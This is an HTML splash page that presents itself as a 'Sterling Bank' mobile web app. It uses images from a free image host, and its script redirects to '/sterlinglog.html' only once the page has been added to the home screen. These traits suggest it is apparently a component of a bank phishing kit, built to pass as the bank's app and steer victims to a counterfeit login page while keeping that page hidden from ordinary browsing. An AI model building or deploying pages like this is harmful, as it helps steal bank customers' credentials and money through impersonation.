<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
    
    <!-- CRITICAL iOS App Meta Tags -->
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="apple-mobile-web-app-title" content="Sterling" />
    <link rel="manifest" href="manifest.json" />
<script src="pwa.js" defer></script>
    <!-- Apple Touch Icon for iPhone Home Screen -->
    <link rel="apple-touch-icon" href="https://iili.io/n3jlvSV.jpg" />
    
    <title>Sterling Bank</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0d0d0f;
            overflow: hidden;
        }
        .splash-container {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0d0d0f;
            position: relative;
        }
        .splash-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            animation: fadeIn 0.8s ease-out 0.2s forwards;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: scale(1.02); }
            100% { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="splash-container">
        <img src="https://iili.io/n3YLIdG.jpg" alt="Sterling Bank" class="splash-image" id="splashImage" />
    </div>

    <script>
        (function() {
            'use strict';

            // Detect standalone mode (iOS)
            const isStandalone = window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches;

            // ONLY redirect if in standalone mode (App)
            if (isStandalone) {
                const redirectDelay = 3000;
                setTimeout(function() {
                    window.location.href = '/sterlinglog.html';
                }, redirectDelay);
            }
            // If NOT in standalone mode, the redirect is disabled. 
            // Users must tap "Add to Home Screen" to enable the redirect.

            const img = document.getElementById('splashImage');
            if (img.complete) {
                // Image already loaded
            } else {
                img.addEventListener('load', function() {
                    // Image loaded
                });
            }

        })();
    </script>
</body>
</html>
